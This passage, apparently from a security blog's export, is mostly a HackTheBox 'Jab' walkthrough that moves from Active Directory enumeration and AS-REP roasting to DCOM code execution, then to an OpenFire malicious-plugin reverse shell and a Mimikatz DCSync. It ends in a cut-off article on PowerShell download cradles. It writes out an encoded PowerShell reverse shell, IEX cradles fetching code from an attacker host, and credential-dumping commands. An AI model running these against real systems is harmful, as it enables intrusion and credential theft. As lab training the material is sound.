to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Computers Users All domain objects A file containing all description fields It will also search the domain for any service/svc accounts and place them in a folder too. We have the naming context of the domain: ┌─(...ontent-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Jab/scans/nmap)───(kali@kali:pts/8)─┐ └─(14:02:13 on main)──\u0026gt; python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box ------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.230.215 • Domain Name : jab.htb • Server Name : DC01 • Forest Level: 7 • Domain Level: 7 It turns out the anonymous bind is (+NOT+) enabled and we get the below information.\n------------------------------------------------------------ Connection Attempts ------------------------------------------------------------ • Attempting SSL connection... ⚠️ Connection established but no read access • Attempting non-SSL connection... ⚠️ Connection established but no read access ------------------------------------------------------------ Connection Failed ------------------------------------------------------------ ⚠️ Could not establish LDAP connection • Anonymous bind may be disabled (good security practice) • Credentials may be incorrect • Server may be unreachable • LDAP/LDAPS ports may be filtered We have the domain functionality level:\n• Forest Level: 7 • Domain Level: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name \u0026amp; domain name:\n------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.230.215 • Domain Name : jab.htb • Server Name : DC01 It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026#34;jab.htb\u0026#34; update_var machine \u0026#34;DC01\u0026#34; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: sudo echo \u0026#34;$box $domain $machine.$domain $machine\u0026#34; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host\u0026rsquo;s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain We get standard entries:\nKerberos 88: Using Kerbrute to bruteforce Usernames: Kerbrute is great for bruteforcing usernames/emails when kerberos is running.\nkerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt That\u0026rsquo;s a lot of usernames…….however pretty realistic in a large environment so lets get these saved and use them later.\nLets extract the emails for ease:\nawk -F: \u0026#39;{ gsub(/^[ \\t]+|[ \\t]+$/, \u0026#34;\u0026#34;, $4); print $4 }\u0026#39; kerbruteUsers.txt \u0026gt;\u0026gt; KEmails.txt This may look complex but all it does is extract the Emails using awk and any leading/trailing whitespace.\nNow we need to extract just the usernames:\nawk -F@ \u0026#39;{ print $1 }\u0026#39; KEmails.txt \u0026gt; KUsernames.txt Now we have two files ready for use.\n2. Foothold: Finding an ASREP Roastable User using impacket-GetNPUsers: We should always try and asreproast with a null/guest session as it can lead to an easy win\n# This one will just work, without having to pass anything else. impacket-GetNPUsers $domain/ -request As we can see it did not work.\nLets try with our extracted kerbrute usernames\nimpacket-GetNPUsers $domain/ -dc-ip $box -usersfile KUsers.txt -format hashcat -outputfile asRepHashes.txt -no-pass And looking at our output file we can see we have captured 3 asrep hashes:\nCracking ASREP tickets to recover clear-text passwords.\n#Cracking hashcat -m 18200 asRepHashes.txt ~/Wordlists/rockyou.txt We managed to crack the users \u0026ldquo;jmontgomery\u0026rdquo; ticket and recover their password \u0026ldquo;Midnight_121\u0026rdquo;\nLets validate the creds.\nnetexec smb $box -u $user -p $pass --shares They are!\nCred stuffing with our found credential: As we have found a valid cred, we can try cred stuffing to see if any other users have the same password:\nkerbrute passwordspray -d $domain --dc $box KUsernames.txt $pass We only get our known user as a hit\nUsing netexec for Kerberoasting: As we have creds we can kerberoast:\nnetexec ldap $box -u $user -p $pass --kerberoast kerb.txt As we can see there is an error, lets try another tool.\nUsing impacket-getuserspns.py\npython3 /home/kali/linuxTools/impacket/examples/GetUserSPNs.py -outputfile kerb.txt -dc-ip $box $domain/$user:$pass No hits.\nSMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold.\nnetexec smb $box -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares netexec smb $box -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares We can see that neither work, however we have creds for a user so we get use them to check.\nTrying Usernames as Passwords: I always try usernames as passwords as well. We can again use our extracted kerbrute usernames file for this check. netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] Enumerating SMB shares using netexec: netexec smb $box -u $user -p $pass --shares Lets spider them for ease and check the results\nnetexec smb $box -u $user -p $pass -M spider_plus Lets see if there is anything of note.\ncat /tmp/nxc_hosted/nxc_spider_plus/*.json Nothing of value\nEnumerating Users with Impacket-lookupsid: We can use impacket-lookupsid to enumerate users \u0026amp; groups on the domain, well anything that has a SID.\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids This has provided some really valuable information as we can see there are two service accounts listed however there is ALOT, so lets do a bloodhound collection to make this easier to process.\nPerforming a Bloodhound Collection: I use bloodhound-python to perform a collection.\nbloodhound-python -d $domain -ns $box -c All -u $user -p $pass I then import these into bloodhound for investigation.\nBloodhound Findings: How many domain admins:\n1 Administrator What users have DC Sync Privileges:\nAdministrator Our users rights:\nLimited. How many users in the domain:\n2685 Interesting users:\nLooking at the svc_openfire user we can see they are a member of the group \u0026ldquo;DISTRIBUTED COM USERS\u0026rdquo; which allows them to \u0026ldquo;Members are allowed to launch, activate and use Distributed COM objects on this machine.\u0026rdquo;\u0026quot; At the moment we don\u0026rsquo;t have access to this user, however it\u0026rsquo;s important to understand how this could be useful moving forward so check out the side quest below.\nSide Quest: What is a COM object? Imagine Windows has a giant library of \u0026ldquo;lego-bricks\u0026rdquo; called COM objects (COM = Component Object Model). And each of these bricks is a module that already knows how to do one specific job, e.g. draw a button, talk to Excel, unzip a file, query a database, etc.\nNow, normally you\u0026rsquo;d have to build that functionality yourself, but COM lets you just say, \u0026ldquo;Hey Windows, hand me the brick that prints PDFs,\u0026rdquo; and you can snap it into your program no matter what language you\u0026rsquo;re writing in, whether that be VBScript, C++, PowerShell or even Word macros.\nLocal vs. Distributed COM? Local COM\nThe brick lives on our own PC. Distributed COM (DCOM)\nThe brick can live on a different machine on the network. Our code could say \u0026ldquo;launch\u0026rdquo; and then Windows contacts that remote computer, instantiates the object there, and sends back a handle so we can use it almost as if it were local. What the permission really means? \u0026#34;Members are allowed to launch, activate and use Distributed COM objects on this machine.\u0026#34; Launch – create a fresh instance of a remote brick. Activate – wake up an existing instance that\u0026rsquo;s already running somewhere. Use – call its methods/properties once we\u0026rsquo;ve got a handle. So if our account is in that group, we can tell Windows:\nSpin up a Word-processing COM object on a file server, Activate a spreadsheet object that\u0026rsquo;s already running on another workstation, Then call ‑into those objects from your local script or application. In short, being in this group is like having a \u0026ldquo;network-wide library card\u0026rdquo; for COM bricks we\u0026rsquo;re trusted to; check them out, wake them up, and use their features across the network and as it says \u0026ldquo;on this machine\u0026rdquo; this means we can launc COM objects on the domain controller itself, in essence RCE.\nJabber 5222/5223 Server: XMPP tools: As xmpp is in the results of our scans we need a tool to interact with the protocol, luckily there is a FOSS tool called pidgin which we can use.\nsudo apt update \u0026amp;\u0026amp; sudo apt install pidgin Side Quest: What\u0026rsquo;s XMPP? XMPP stands for Extensible Messaging and Presence Protocol. It\u0026rsquo;s a communication protocol. Basically it\u0026rsquo;s a set of rules computers use to send messages to each other.\nThink of XMPP like email but for chat: you can use different apps, run your own server if you want, and talk to people across the network.\nWhat is XMPP used for? XMPP is mostly used for real-time chat, but it can also handle things like video calls, file sharing, and even notifications.\nInstant Messaging – Like WhatsApp or Facebook Messenger, but open and decentralized. Team Communication – Some companies use XMPP-based tools to chat internally. IoT Devices – Smart devices can use XMPP to send updates or alerts. Gaming – XMPP can handle chat between players or game server notifications. Why use XMPP? It\u0026rsquo;s open-source and decentralized which means anyone can run their own server. It supports end-to-end encryption for privacy. It\u0026rsquo;s extensible, meaning developers can add custom features easily through things like plugins etc. Connecting as jmontgomery via XMPP: This is the first time I have used XMPP or pidgin so this took me a while to configure, mainly due to lack of experience however I mangaged to get connected.\nConfigure the account: Once you open pidgin you will need to add an account, as we already have creds for jmontgomery we can use those.\nUnder advanced set the following settings:\nThen click \u0026ldquo;Save\u0026rdquo;\nViewing available rooms: You will now have a blank screen however if we click \u0026ldquo;buddies\u0026rdquo; \u0026amp; then \u0026ldquo;Jon a Chat\u0026rdquo;\nYou will be given this next screen click \u0026ldquo;Room List\u0026rdquo;\nAnother pop up will appear with the conference server listed as conference.jab.htb now click \u0026ldquo;Find Rooms\u0026rdquo;\nWe should now be presented with a list of rooms, as you can see there is a pentest2003 room, plus some test rooms. We will check all rooms to be sure.\nJoining rooms: Click on the room and then click \u0026ldquo;Join\u0026rdquo;\nI know, I know we should join the pentest room first, however we need to do our due diligence and check all rooms, well luckily for you we can\u0026rsquo;t join the base test room.\n3. Lateral Movement: Finding clear text credentials for the svc_openfire user in the pentest xmpp chat: Looking at the pentest chat we can see that they have pasted text from the pentest report, where they were advised to remove the Service Principal Name (SPN) from the svc_openfire account.\n+Note+: This remediation would be advised by the pentesters, removing the SPN would be performed as if an account has an SPN it can be kerberoasted, and the clear text password cracked from the hash. However it appears the testers did not redact the clear text password and it is available in the output.\nVerifying the svc_openfire credentials: netexec smb $box -u $user -p $pass --shares Valid, great we don\u0026rsquo;t seem to have access to any further shares :(\n+Note+: I also add svc_openfire to pidgin to see if they have access to any other rooms but they do not appear too.\nChecking the test2 room: Looking at the test2 room we can see there is one entry from bdavis\nOut of curiosity if we decode the base64 string it gives us the following output\necho \u0026#39;VGhlIGltYWdlIGRhdGEgZ29lcyBoZXJlCg==\u0026#39; | base64 -d Getting RCE Using impacket-dcomexec: As we saw in bloodhound our user svc_openfire has the permission to launch, activate and use COM objects on the DC itself, but how do we do it? Well luckily for us, impacket has a great script call impacket-dcomexec which is designed for this specific task\nChecking for remote code execution: Let\u0026rsquo;s do the simplest test possible and see if we can get the DC to ping our attack host.\n+Note+: You may be asking \u0026ldquo;but if you don\u0026rsquo;t pass an argument as per the instructions it just opens a semi-interactive shell?\u0026rdquo; well you\u0026rsquo;re right but that did not work for me on this box, so lets keep it moving. Start our listener with tcpdump\nsudo tcpdump -i tun0 icmp Pass our command using impacket-dcomexec\nimpacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user:$pass@$box \u0026#39;ping 10.10.14.31\u0026#39; It works so we have remote code execution!\nThis is telling the target to:\nConnect to the remote machine $box Authenticate using $domain/$user:$pass Instantiate the MMC20.Application object via DCOM Silently execute the command: ping 10.10.14.31 If this works, it means you were able to remotely execute code via a COM object — without writing a file, triggering AV, or needing an interactive session.\nSide Quest: What\u0026rsquo;s an MMC20.Application? The MMC20.Application is, as you guessed it, a COM object provided by Microsoft. It is tied to the Microsoft Management Console (MMC). It\u0026rsquo;s basically a programmatic interface to the same MMC framework which we can use when launching tools like:\nservices.msc (Services) gpedit.msc (Group Policy Editor) compmgmt.msc (Computer Management) But in this case, it\u0026rsquo;s the underlying object, not the GUI itself.\nThe 20 refers to version 2.0. This is just the standard naming convention for COM object versioning.\nWhat does it do? The MMC20.Application object is a scripting interface to the MMC.\nIt can: Load snap-ins (like the Services or Disk Management modules) Execute commands (good for us!) Launch scripts or other processes as the user it\u0026rsquo;s running under (good for us!) Which means if we\u0026rsquo;re able to instantiate this object remotely using DCOM, we can tell it to run something, anything a command a script both and it\u0026rsquo;ll do so under the security context of the user that owns the process, in this case the user svc_openfire however it\u0026rsquo;s often SYSTEM or an admin as this is a high-level privilege.\nWhy is MMC20 used in DCOM exploits? MMC20.Application is useful in DCOM-based remote code execution (RCE) o/privilege escalation because it:\nCan be remotely activated via DCOM if permissions are misconfigured. Often support methods that let us execute arbitrary commands or scripts. Are already present on many systems (no need to upload anything). This is why it shows up in tools like impacket-dcomexec.\nGetting a Shell on DCO1 as svc_openfire: As we have confirmed RCE on the host we can now get a reverse shell. I\u0026rsquo;ve provided two options on how to do this below. The first being a standard base64 encoded shell and the other by way of a download cradle.\nOption One Standard base64 encoded shell: I like to use https://www.revshells.com/ and use the base64 encoded Powershell option.\nimpacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user:$pass@$box \u0026#39;powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAxACIALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\u0026#39; We get a connection\nLets get our user flag:\nPowershell Download Cradle: I have an article about download cradles available here, this is my preffered method.\nhttps://bloodstiller.com/articles/understandingdownloadcradles/ Create the powershell cradle file:\necho \u0026#39;IEX (New-Object Net.Webclient).downloadstring(\u0026#34;http://10.10.14.31/rev.ps1\u0026#34;)\u0026#39; \u0026gt;\u0026gt; cradle This will be used to grab the hosted shell from our system. Encode the powershell cradle in correct UTF format so powershell can understand it.\ncat cradle | iconv -t UTF-16LE | base64 -w 0; echo Breakdown:\ncat cradle: Reads the contents of the file (which is the PowerShell command). iconv -t UTF-16LE: Converts the plain text into UTF-16 Little Endian encoding. PowerShell\u0026rsquo;s -EncodedCommand parameter expects the input to be in UTF-16LE format because that\u0026rsquo;s how Windows internally represents strings. base64 -w 0: Base64-encodes the UTF-16LE data. -w 0 ensures the output is all on one line (no line breaks), which is required for PowerShell to interpret it correctly. echo: Just adds a newline at the end so you don\u0026rsquo;t get a messy prompt afterward. +Note+: I would always base64 encode cradles as often special characters such as parenthesis etc will need escaping to function correctly. Prepare our shell, I like to use nishang however you can use http://revshells.com etc.\nCopy our shell cp ~/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1 Modify IP/Port in shell if required. vi rev.ps1 Start our webserver:\nsudo python -m http.server 80 Start our listener:\nrlwrap -cAr nc -nvlp 53 Paste the base64 encoded command into powershell/injection point\nimpacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user:$pass@$box \u0026#39;powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwAxAC8AcgBlAHYALgBwAHMAMQAiACkACgA=\u0026#39; Shell caught.\nFinding out openfire is running internally: Enumerating the network connections I can see that openfire is running internally. (the only reason I know this is that I just did the box https://bloodstiller.com/walkthroughs/solarlab-box/ and these port numbers are seared into my brain.\nTo access this we will need to port forward from the target to our local machine, let\u0026rsquo;s use chisel .\nCreating a tunnel with chisel : As OpenFire is running locally we have no way of accessing it without creating a tunnel back to ourselves to access it, so lets do that with chisel .\n+Note+: I would usually use ligolo-ng as that\u0026rsquo;s my preferred tunneling tool however it\u0026rsquo;s been a while since I\u0026rsquo;ve used chisel and this is a good way to dust off the cobwebs. Prerequisite: You will need the binaries, for both Debian (if using kali/parrot etc as an attack machine) and for the target Windows, you can get these from: https://github.com/jpillora/chisel/releases/ Transfer the binary to the target\nwget http://10.10.14.31:9000/chisel.exe -o chisel.exe Start a listener on kali:\n./chisel server -p 8989 --reverse Connect back to our listener on kali and redirect traffic from port 9090 on the target to port 8000 on our attack machine.\nStart-Process -FilePath .\\chisel.exe -ArgumentList \u0026#39;client 10.10.14.31:8989 R:8000:127.0.0.1:9090\u0026#39; +Note+: We use the Start-Process cmdlet as it allows us to background the process and continue to use the shell as normal. Let\u0026rsquo;s verify if we can access the service, and we can.\n+Note+: We can see it\u0026rsquo;s running version 4.7.5 4. Privilege Escalation: Logging into OpenFire as svc_openfire: As we have creds for the openfire account lets check if we can login as them and we can.\nFinding the export user plugin: Looking at the plugins installed we can see there is a \u0026ldquo;User Import Export\u0026rdquo; plugin installed.\nClicking on the icon (arrow for ease) we can view the readme for the plugin. We can see that we can export the data and it will contain clear text passwords and it\u0026rsquo;s in .xml format.\nExporting Clear Text Creds from OpenFire: Navigating to the \u0026ldquo;Users/Groups\u0026rdquo; page we can access the plugin via the \u0026ldquo;Import \u0026amp; Export\u0026rdquo; section.\nClicking \u0026ldquo;Export User Data\u0026rdquo; we can then select \u0026ldquo;Export\u0026rdquo;\nIf we do this we should now have a lovely .xml file full of creds.\nFinding Admin Credentials in the xml: Looking through the exported xml we can see it\u0026rsquo;s full of passwords.\nIf you look at the admin password you can see it contains it contains the part \u0026amp;amp; this is just xml encoding for the symbol \u0026amp;, so we need to remove the other parts until we are left with:\nodW!!mVfbXs304kskt!QAZDVGY\u0026amp;@ I check if this is valid, but it does not work.\nI check some other accounts too and can see it\u0026rsquo;s the same.\nIf we look at our user svc_openfire we can see that it is actually the password. This is most likely as it\u0026rsquo;s a service account so the password has not been changed or re-used, naughty.\nLogging into pidgin as admin: We repeat the same process as earlier and login as the administrator.\nThey only have access to the rooms we have already seen previously.\nExtracting all passwords from the xml: As we have a list of users and passwords, it would be rude not to extract them and try them against the target.\nCreating a tool to extract usernames \u0026amp; passwords in python: Python has good xml support so this should be easy to do.\nLets get the required imports:\nimport xml.etree.ElementTree as ET We will use the xml library and call it as ET for ease.\nNow lets load in our extracted file and parse it using the xml library:\n# Load and parse the XML tree = ET.parse(\u0026#34;openfiredata.xml\u0026#34;) # Change this to your file path We will then use the library to get the root element of the XML tree:\nroot = tree.getroot() Let\u0026rsquo;s create two new files for writing the output too, xml_users \u0026amp; xml_passwords:\n# Open both files for writing with open(\u0026#34;xml_users.txt\u0026#34;, \u0026#34;w\u0026#34;) as users_file, open( \u0026#34;xml_passwords.txt\u0026#34;, \u0026#34;w\u0026#34; ) as passwords_file: Now we create a simple loop to loop through the file from the xml root object, and search for the string \u0026ldquo;Username\u0026rdquo; \u0026amp; \u0026ldquo;Password\u0026rdquo;. and save them to variables username \u0026amp; password.\nfor user in root.findall(\u0026#34;User\u0026#34;): username = user.find(\u0026#34;Username\u0026#34;).text password = user.find(\u0026#34;Password\u0026#34;).text Finally lets write these returned usernames and passwords to our files and add a new line character \\n at the end of each entry so that we don\u0026rsquo;t end up with a single line output.\nusers_file.write(username + \u0026#34;\\n\u0026#34;) passwords_file.write(password + \u0026#34;\\n\u0026#34;) The final script should look like this.\nimport xml.etree.ElementTree as ET # Load and parse the XML tree = ET.parse(\u0026#34;openfiredata.xml\u0026#34;) # Change this to your file path root = tree.getroot() for user in root.findall(\u0026#34;User\u0026#34;): username = user.find(\u0026#34;Username\u0026#34;).text password = user.find(\u0026#34;Password\u0026#34;).text users_file.write(username + \u0026#34;\\n\u0026#34;) passwords_file.write(password + \u0026#34;\\n\u0026#34;) Lets run it\npython3 dataextractor.py We have our files\nLets verify that the passwords are in fact extracted in the correct order. The easiest way I find to do this is to look at the first and last entries, this way it will tell us if at anypoint it had slipped out of sequence for whatever reason, e.g. a user had no password entry or there was an issue with the script logic.\nhead xml_passwords.txt head xml_users.txt head openfiredata.xml tail xml_passwords.txt tail xml_users.txt tail openfiredata.xml As we can see below this looks good so we can continue to spraying these passwords.\nPassword Spraying the recovered creds: As these are username and password combos we don\u0026rsquo;t want to bruteforce, e.g. use every single variation with each other, luckily netexec allows to specify the --no-bruteforce flag which will mean it goes through the files at the same in the same order.\nnetexec smb $box -u xml_users.txt -p xml_passwords.txt --no-bruteforce --continue-on-success And…..the only hits we get are for our already recovered users jmontogomery \u0026amp; svc_openfire.\nCred stuffing our 3 found passwords with our new list of users: As we have a list of recovered passwords, we can cred stuff these with our new list of found users.\nnetexec smb $box -u xml_users.txt -p ../Passwords.txt --continue-on-success | grep [+] Unfortunately we only get a hit on the records we have already gotten.\nReading the openfire db: Openfire has it\u0026rsquo;s own DB called openfire.script located in C:\\Program Files\\OpenFire\\embedded-db.\nIf you read my solarlab blog post, you will see I wrote a small decryptor in python to decrypt passwords.\nhttps://bloodstiller.com/walkthroughs/solarlab-box/#openfire-db Looking at the database on the host we can see the passwordKey is available\ncat openfire.script | select-string \u0026#34;passwordKey\u0026#34; We can then extract the hashed admin password:\ncat openfire.script | select-string \u0026#34;admin\u0026#34; Running it through the decryptor gives the same admin password we extracted before. I expected this to be the case but wanted to check to make sure.\nGetting A Shell Via Malicious OpenFire Plugin: So I tried a million different things before trying what I had literally done last week on the solar-lab box as I thought, \u0026ldquo;There is no way privesc will be the same surely\u0026rdquo;, but guess who was wrong.\nCreating a malicious reverse shell plugin for OpenFire: After some searching online we can find a public java reverse shell\nwget https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/refs/heads/main/shell.jsp All we have to do is modify the Port \u0026amp; IP.\nNext we download the example plugin repo from OpenFire.\ngit clone https://github.com/igniterealtime/openfire-exampleplugin.git cd openfire-exampleplugin We copy the shell.jsp to exampleplugin-page.jsp location for compilation\ncp ../shell.jsp ./src/main/web/exampleplugin-page.jsp We will need to install apache maven to compile this exploit, so if you don\u0026rsquo;t have it already run the below to install it.\nsudo apt update \u0026amp;\u0026amp; sudo apt install maven -y Now we need to create the package.\nmvn -B package Once complete you should get a successful build message:\n+Note+: There will most likely be ALOT of output here as maven will download the relevant dependencies etc so be patient. Next we put the plugin into the correct structure for uploading to OpenFire.\ncp ./target/exampleplugin.jar exampleplugin.zip; zip -ur exampleplugin.zip ./plugin.xml ./readme.html; mv exampleplugin.zip ./target/exampleplugin.jar; The correct file is exampleplugin.jar located in target/\nStart a listener:\nrlwrap -cAr nc -nvlp 6969 Next we upload the exploit\nNow we finally trigger the plugin so our reverse shell is active. As this version is not vulnerable to the traversal exploit we can just call it straight in the browser from an authenticated session\nhttp://localhost:8000/plugins/exampleplugin/exampleplugin-page.jsp? Get our root flag:\nStabilize Shell: You will probably notice the shell is quite unstable. To rectify this we can easily generate a base64 encoded shell on revshells.com and a new listener and catch a new shell from our existing unstable shell.\npowershell -e [base64] 5. Persistence: Using mimikatz to dump the administrator hash: First lets use a download cradle to load mimikatz into memory using the Invoke-Mimikatz.ps1 script.\nGet script\nwget https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1 Start a server to serve the script on our host:\npython3 -m http.server 9000 IEX (New-Object Net.Webclient).downloadstring(\u0026#34;http://10.10.14.31:9000/Invoke-Mimikatz.ps1\u0026#34;) Then lets get the administrator hash as that will make life easier.\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;privilege::debug\u0026#34; \u0026#34;lsadump::dcsync /domain:jab.htb /user:administrator\u0026#34;\u0026#39; Lets validate the hash:\nnetexec smb $box -u $user -H $hash --shares It\u0026rsquo;s valid as expected, but it\u0026rsquo;s always good to check.\nDumping NTDS.dit/DCSync attack: You may be wondering why we didnt\u0026rsquo; just do this with mimikatz, well the host is quite slow and the shell not too reliable so if we get a hash we can use linux based tools to get this information remotely.\nPerform DCSync attack using netexec to get all the hashes, this will take a WHILE so be patient.\nnetexec smb $box -u $user -H $hash -M ntdsutil Extract all hashes from netexec\nfor file in /home/kali/.nxc/logs/DC01_10.129.239.38_2025-04-25_131914.ntds; do cat \u0026#34;$file\u0026#34; | cut -d \u0026#39;:\u0026#39; -f1,2,4 --output-delimiter=\u0026#39; \u0026#39; | awk \u0026#39;{print $3, $2, $1}\u0026#39;; printf \u0026#39;\\n\u0026#39;; done Lessons Learned: What did I learn? I learned a good lesson in doing the obvious. I had done the solar-lab box before this and it has a similar privilege escalation method but I thought it couldn\u0026rsquo;t be that as it\u0026rsquo;s too obvious. I actually learned alot about xmpp. I was aware of it previously as a concept and would have used it withougt knowing however I had no direct interaction like this with it. What silly mistakes did I make? Not doing the obvious when I should have. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

        "tags": ["Windows","Active Directory","PowerShell","DownloadCradle","Download Cradle","Security","System Administration","Windows Security","PowerShell Scripting",],
        "content": "Updates: Article originally published on 11-11-2024\nUpdated with additional information on 24-04-2025\nIntroduction PowerShell has revolutionized system administration and automation. One of its powerful yet often misunderstood features is the PowerShell download cradle. This article explores what download cradles are, their uses, and best practices for implementation.\nWhat is a PowerShell Download Cradle? A PowerShell download cradle is a technique that enables downloading and executing code directly in memory without writing to disk. This approach can help bypass security mechanisms.\nCore Components and Techniques Essential Cmdlets Invoke-WebRequest: Retrieves content from web pages Invoke-Expression (alias: IEX): Executes PowerShell commands from strings System.Net.WebClient: .NET class for web server interactions Basic Syntax Example using Invoke-Mimikatz: Load Script into memory: Running Invoke-Mimikatz from memory:\nCommon Download Cradle Examples: Basic WebClient Method # Standard WebClient download cradle IEX (New-Object Net.Webclient).downloadstring(\u0026#34;https://example.com/script.ps1\u0026#34;) # PowerShell 3.0+ using Invoke-WebRequest (alias: iwr) IEX (iwr \u0026#39;https://example.com/script.ps1\u0026#39;) COM Object Methods # Internet Explorer COM object $ie = New-Object -comobject InternetExplorer.Application $ie.visible = $False $ie.navigate(\u0026#39;https://example.com/script.ps1\u0026#39;) start-sleep -s 5 $r = $ie.Document.body.innerHTML $ie.quit() IEX $r # Msxml2.XMLHTTP COM object (proxy-aware) $h = New-Object -ComObject Msxml2.XMLHTTP $h.open(\u0026#39;GET\u0026#39;,\u0026#39;https://example.com/script.ps1\u0026#39;,$false) $h.send() iex $h.responseText Advanced Download Cradle Techniques: # DNS TXT Record Method IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String( 